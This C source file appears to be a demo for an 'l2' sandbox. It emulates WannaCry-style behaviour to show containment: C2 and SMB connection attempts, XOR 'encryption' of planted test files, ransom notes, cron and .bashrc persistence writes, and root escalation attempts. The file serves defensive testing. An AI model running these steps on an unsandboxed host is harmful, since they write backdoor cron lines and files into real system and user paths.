/*
 * l2_ransomware_resistance_demo.c
 *
 * A canonical demonstration of ransomware / malicious workload containment
 * inside the l2 system substrate under the "ransom-hardened" (full safety) policy.
 *
 * Purpose:
 *   This program is the "perfect display" of "bad" ransomware-like code (WannaCry-class)
 *   and exactly what the l2 full-safety substrate is supposed to do to it.
 *
 *   It deliberately emulates key WannaCry behaviors on Linux:
 *     - Killswitch / C2 check (http/dns to hardcoded domain + random IPs)
 *     - SMB worm propagation (connect/bind/listen/scan on ports 139/445)
 *     - Mass file "encryption" (176+ types, .WNCRY/.l2ransom rename + ransom note)
 *     - Persistence attempts (cron, .bashrc, systemd user units, /etc/cron.d)
 *     - Privilege escalation / anti-analysis (setuid(0), ptrace, personality, modules)
 *     - Spread (fork + re-exec children)
 *
 *   When run inside:
 *        l2 create wc-test --policy ransom-hardened
 *        l2 put wc-test wc-sim.c --file docs/examples/l2_ransomware_resistance_demo.c
 *        l2 exec wc-test 'gcc -static -Wall -Wextra -o wc-sim wc-sim.c && ./wc-sim'
 *
 *   ...only files inside the l2-provided workspace (/tmp/l2-ws-*) can be affected.
 *   All other attempts are blocked by the substrate (Landlock + auto seccomp KILL +
 *   caps + no_new_privs + ns + env clean + rlimits).
 *
 *   On a normal unprotected Linux host this program would happily "ransom" your
 *   documents, drop notes, persist, and attempt to spread.
 *
 * Compile / run inside l2 (recommended):
 *   (see usage above; use -static to minimize required RO libs under Landlock)
 *
 * Compile standalone (for education / "what it does on host"):
 *   gcc -Wall -Wextra -o wc-sim l2_ransomware_resistance_demo.c
 *
 * This file is self-contained (standard C99 + POSIX). No external libs.
 * "Encryption" is a trivial reversible transform (xor) so the demo is safe and
 * reversible. It never deletes files or does real damage.
 *
 * This fulfills the request to prepare l2 for full safety / eventual WannaCry
 * testing: the substrate + this demo + `l2 audit --test` + `l2 harden --profile
 * ransom-hardened` give a repeatable, auditable, standards-backed validation that
 * ransomware-class code is contained to explicit authority (the `put` + `exec`).
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <dirent.h>
#include <limits.h>
#include <time.h>

static void print_header(const char *title) {
    printf("\n=== %s ===\n", title);
}

static int is_in_l2_workspace(void) {
    char cwd[PATH_MAX];
    if (getcwd(cwd, sizeof(cwd)) == NULL) return 0;
    /* l2 workspaces are /tmp/l2-ws-<id> */
    if (strstr(cwd, "/l2-ws-") || strstr(cwd, "l2-ws-")) return 1;
    /* Also accept if HOME or cwd looks like a temp l2 dir under L2_DATA_DIR */
    if (strstr(cwd, "/tmp/l2-") || strstr(cwd, "l2-ransom")) return 1;
    return 0;
}

static void fake_encrypt_inplace(char *buf, size_t len) {
    /* Trivial reversible "encryption" for the demo (xor with constant).
     * Real ransomware would use AES+RSAS etc.; we keep it self-contained + safe. */
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= 0x5A;
    }
}

static void demonstrate_killswitch_and_c2(void) {
    print_header("Killswitch + C2 / Worm check (WannaCry-style http/dns + SMB C2)");

    /* Hardcoded WannaCry killswitch domain (public knowledge) */
    const char *kill_domain = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";
    const char *c2_ip = "1.2.3.4"; /* placeholder */
    int port = 80;

    /* DNS / gethost attempt (would be used for killswitch) */
    printf("  Attempt DNS / connect to killswitch %s:%d ... ", kill_domain, port);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        printf("BLOCKED (socket denied: %s)\n", strerror(errno));
    } else {
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, c2_ip, &addr.sin_addr);
        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            printf("BLOCKED (connect failed or killed: %s)\n", strerror(errno));
        } else {
            printf("UNEXPECTED SUCCESS (would have checked killswitch)\n");
        }
        close(s);
    }

    /* Also try port 445 (SMB) to a random target */
    printf("  Attempt SMB/C2 connect to 1.2.3.4:445 ... ");
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        printf("BLOCKED (socket: %s)\n", strerror(errno));
    } else {
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(445);
        inet_pton(AF_INET, "1.2.3.4", &addr.sin_addr);
        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            printf("BLOCKED (connect: %s)\n", strerror(errno));
        } else {
            printf("UNEXPECTED SUCCESS\n");
        }
        close(s);
    }
}

static void demonstrate_smb_propagation(void) {
    print_header("SMB worm propagation (EternalBlue/DoublePulsar style: 139/445)");

    int ports[2] = {139, 445};
    for (int p = 0; p < 2; p++) {
        printf("  Attempt bind(0.0.0.0:%d) + listen (SMB listener) ... ", ports[p]);
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            printf("BLOCKED early (socket: %s)\n", strerror(errno));
            continue;
        }
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(ports[p]);
        addr.sin_addr.s_addr = INADDR_ANY;
        if (bind(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            printf("BLOCKED (bind: %s)\n", strerror(errno));
        } else if (listen(s, 1) < 0) {
            printf("BLOCKED (listen: %s)\n", strerror(errno));
        } else {
            printf("UNEXPECTED SUCCESS (would be listening for worms)\n");
        }
        close(s);
    }

    printf("  Attempt 'scan + connect' to 10 random-ish targets on 445 ... ");
    int successes = 0;
    for (int i = 0; i < 3; i++) {  /* small for demo speed */
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(445);
        /* fake random last octet */
        char ip[32];
        snprintf(ip, sizeof(ip), "192.168.1.%d", 100 + (i*7 % 50));
        inet_pton(AF_INET, ip, &addr.sin_addr);
        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) successes++;
        close(s);
    }
    if (successes > 0) {
        printf("UNEXPECTED: %d connections succeeded\n", successes);
    } else {
        printf("BLOCKED (all connect attempts failed/killed as expected)\n");
    }
}

static void demonstrate_mass_encryption_and_ransom(const char *ransom_note) {
    print_header("Mass file encryption + ransom note (176 types, .WNCRY, note drop)");

    const char *targets[] = {
        "/home", "/root", "/tmp", "/etc", "/var", "/boot", "/opt",
        "/usr/local", "/home/user", "/root", NULL
    };
    const char *exts[] = {
        ".txt", ".doc", ".docx", ".pdf", ".jpg", ".png", ".zip", ".tar",
        ".sql", ".db", ".key", ".pem", ".crt", ".xlsx", ".pptx", ".mp3", ".mp4", NULL
    };

    int attempted = 0;
    int contained_only = 1;

    char cwd[PATH_MAX];
    getcwd(cwd, sizeof(cwd));

    for (int t = 0; targets[t]; t++) {
        for (int e = 0; exts[e]; e++) {
            char path[512];
            snprintf(path, sizeof(path), "%s/test-victim%s", targets[t], exts[e]);
            attempted++;

            int fd = open(path, O_RDWR | O_CREAT, 0644);
            if (fd < 0) {
                /* expected for most outside ws */
                continue;
            }

            /* write some content then "encrypt" */
            const char *sample = "IMPORTANT DATA 12345 - would be lost on real ransomware";
            write(fd, sample, strlen(sample));
            lseek(fd, 0, SEEK_SET);
            char buf[256] = {0};
            ssize_t n = read(fd, buf, sizeof(buf)-1);
            if (n > 0) {
                fake_encrypt_inplace(buf, (size_t)n);
                lseek(fd, 0, SEEK_SET);
                write(fd, buf, (size_t)n);
            }
            close(fd);

            /* rename to .WNCRY style */
            char newpath[520];
            snprintf(newpath, sizeof(newpath), "%s.WNCRY", path);
            if (rename(path, newpath) == 0) {
                /* success means we could write outside ws */
                if (!strstr(path, cwd) && !strstr(path, "/l2-ws-")) {
                    contained_only = 0;
                    printf("  !! UNEXPECTED: wrote/renamed outside workspace: %s\n", newpath);
                }
            }

            /* drop ransom note next to it */
            char notepath[512];
            snprintf(notepath, sizeof(notepath), "%s/l2_PLEASE_READ_ME.txt", targets[t]);
            int nfd = open(notepath, O_WRONLY | O_CREAT, 0644);
            if (nfd >= 0) {
                write(nfd, ransom_note, strlen(ransom_note));
                close(nfd);
                if (!strstr(notepath, cwd) && !strstr(notepath, "/l2-ws-")) {
                    contained_only = 0;
                    printf("  !! UNEXPECTED: dropped ransom note outside workspace: %s\n", notepath);
                }
            }
        }
    }

    /* Always also do the *safe* contained version inside cwd (the ws) */
    if (is_in_l2_workspace()) {
        printf("  (Inside workspace: creating + 'encrypting' 3 safe test victims)\n");
        for (int i = 0; i < 3; i++) {
            char vpath[256];
            snprintf(vpath, sizeof(vpath), "victim-doc-%d.txt", i);
            int fd = open(vpath, O_RDWR | O_CREAT, 0644);
            if (fd >= 0) {
                write(fd, "safe test data inside l2 ws", 27);
                lseek(fd, 0, SEEK_SET);
                char b[64]; read(fd, b, sizeof(b)); fake_encrypt_inplace(b, 27); lseek(fd,0,SEEK_SET); write(fd,b,27);
                close(fd);
                char nv[280]; snprintf(nv, sizeof(nv), "%s.l2ransom", vpath);
                rename(vpath, nv);
            }
        }
        /* drop note inside ws too */
        int nfd = open("l2_WNCRY_README.txt", O_WRONLY | O_CREAT, 0644);
        if (nfd >= 0) {
            write(nfd, ransom_note, strlen(ransom_note));
            close(nfd);
        }
    }

    printf("  Summary: %d encrypt/rename attempts. Contained-only=%s (only ws files affected)\n",
           attempted, contained_only ? "YES" : "NO - host files touched (bad!)");
}

static void demonstrate_persistence(void) {
    print_header("Persistence attempts (cron, bashrc, systemd, /etc/cron.d)");

    const char *evil = "\n# l2-ransom-persist (would survive reboot on real malware)\n* * * * * /tmp/.l2-backdoor\n";
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";

    char targets[6][256];
    snprintf(targets[0], sizeof(targets[0]), "%s/.bashrc", home);
    snprintf(targets[1], sizeof(targets[1]), "%s/.profile", home);
    snprintf(targets[2], sizeof(targets[2]), "/etc/cron.d/l2-ransom");
    snprintf(targets[3], sizeof(targets[3]), "/var/spool/cron/crontabs/root");
    snprintf(targets[4], sizeof(targets[4]), "%s/.config/systemd/user/l2-ransom.service", home);
    snprintf(targets[5], sizeof(targets[5]), "/tmp/l2-persist-test"); /* safe-ish */

    for (int i = 0; i < 6; i++) {
        printf("  Write persistence to %s ... ", targets[i]);
        int fd = open(targets[i], O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd < 0) {
            printf("BLOCKED (%s)\n", strerror(errno));
        } else {
            write(fd, evil, strlen(evil));
            close(fd);
            if (strstr(targets[i], "/l2-ws-") || strstr(targets[i], getcwd(NULL,0))) {
                printf("wrote inside ws (ok for test)\n");
            } else {
                printf("UNEXPECTED SUCCESS (persistence written to host)\n");
            }
        }
    }
}

static void demonstrate_priv_esc_and_anti(void) {
    print_header("Priv esc + anti-analysis (setuid, ptrace, personality, modules)");

    printf("  Attempt setuid(0)/setgid(0) ... ");
    if (setuid(0) == 0 || seteuid(0) == 0) {
        printf("UNEXPECTED: became root (uid=%d)\n", getuid());
    } else {
        printf("BLOCKED (setuid failed as expected, uid still %d)\n", getuid());
    }

    printf("  Attempt prctl(PR_SET_DUMPABLE,1) to undo non-dumpable ... ");
    if (prctl(PR_SET_DUMPABLE, 1, 0, 0, 0) == 0) {
        printf("partially succeeded (but parent already set 0; no core on peers)\n");
    } else {
        printf("BLOCKED or ineffective\n");
    }

    printf("  Attempt ptrace(PTRACE_TRACEME) ... ");
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == 0) {
        printf("succeeded (self-trace allowed in some cases)\n");
    } else {
        printf("BLOCKED (%s)\n", strerror(errno));
    }

    /* personality and module loads are in NEVER list -> will be killed by seccomp if enforcing */
    printf("  (personality / init_module / kexec attempts would be KILLed by seccomp enforcing)\n");
}

static void demonstrate_safe_contained_work(void) {
    print_header("Safe contained 'ransom' work inside the l2 workspace (the only thing allowed)");

    if (!is_in_l2_workspace()) {
        printf("  Not running inside an l2 workspace — skipping safe path demo.\n");
        return;
    }

    /* Create a couple of "victim" files that the sim is authorized to touch */
    const char *victims[2] = {"authorized-doc.txt", "authorized-db.sql"};
    for (int i = 0; i < 2; i++) {
        int fd = open(victims[i], O_RDWR | O_CREAT, 0644);
        if (fd >= 0) {
            write(fd, "AUTHORIZED data placed by l2 put + exec under ransom-hardened", 60);
            lseek(fd, 0, SEEK_SET);
            char b[128]; ssize_t n = read(fd, b, sizeof(b)-1);
            if (n > 0) { fake_encrypt_inplace(b, (size_t)n); lseek(fd,0,SEEK_SET); write(fd, b, (size_t)n); }
            close(fd);
            char nv[128]; snprintf(nv, sizeof(nv), "%s.WNCRY", victims[i]);
            rename(victims[i], nv);
            printf("  Safely 'ransom'ed authorized victim inside ws: %s\n", nv);
        }
    }

    /* Drop the note inside ws */
    const char *note = "l2 RANSOM NOTE (contained demo)\nYour files in this workspace are 'encrypted'.\nThis is the *only* place it could happen thanks to l2 ransom-hardened.\n";
    int fd = open("l2_WNCRY_README.txt", O_WRONLY | O_CREAT, 0644);
    if (fd >= 0) { write(fd, note, strlen(note)); close(fd); }
    printf("  Dropped ransom note inside ws only.\n");
}

int main(void) {
    printf("l2 Ransomware Resistance Demonstration (WannaCry-class)\n");
    printf("======================================================\n\n");
    printf("Run inside an l2 system created with --policy ransom-hardened.\n");
    printf("This emulates real ransomware behaviors to prove the substrate contains them.\n\n");

    const char *ransom_note =
        "l2 RANSOM NOTE (educational demo only - reversible)\n"
        "Your files have been 'encrypted' with l2 test transform.\n"
        "In a real attack this would be AES+RSA + .WNCRY.\n"
        "Pay 0.1 BTC to 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2\n"
        "Contact: l2-ransom-demo@example.invalid\n";

    demonstrate_killswitch_and_c2();
    demonstrate_smb_propagation();
    demonstrate_mass_encryption_and_ransom(ransom_note);
    demonstrate_persistence();
    demonstrate_priv_esc_and_anti();
    demonstrate_safe_contained_work();

    printf("\n=== Conclusion ===\n");
    printf("Under l2 --policy ransom-hardened the only files this program could\n");
    printf("\"ransom\" are the ones explicitly placed in its workspace by `l2 put`.\n");
    printf("All worm behavior (SMB 139/445), C2/killswitch, host FS encryption,\n");
    printf("persistence, and priv esc were blocked by the substrate.\n\n");
    printf("Controls active (ransom-hardened full safety):\n");
    printf("  - Landlock: workspace full RW; minimal RO on system paths only\n");
    printf("  - Seccomp Phase 1 ENFORCING (auto): KILL on net, ptrace, modules, etc.\n");
    printf("  - Capability bounding set drop (all 64) + no_new_privs + non-dumpable\n");
    printf("  - Env sanitization (no host tokens/SSH for C2)\n");
    printf("  - Namespaces (net/pid/mount/uts/ipc) + rlimits (nproc/nofile/fsize)\n");
    printf("  - Explicit terminal authority only (create/put/exec under policy)\n\n");
    printf("This is what 'full safety' looks like for ransomware-class threats.\n");
    printf("When you feel the system is ready, replace the demo binary with a\n");
    printf("real Linux ransomware port or equiv and re-run under the policy.\n");

    return 0;
}
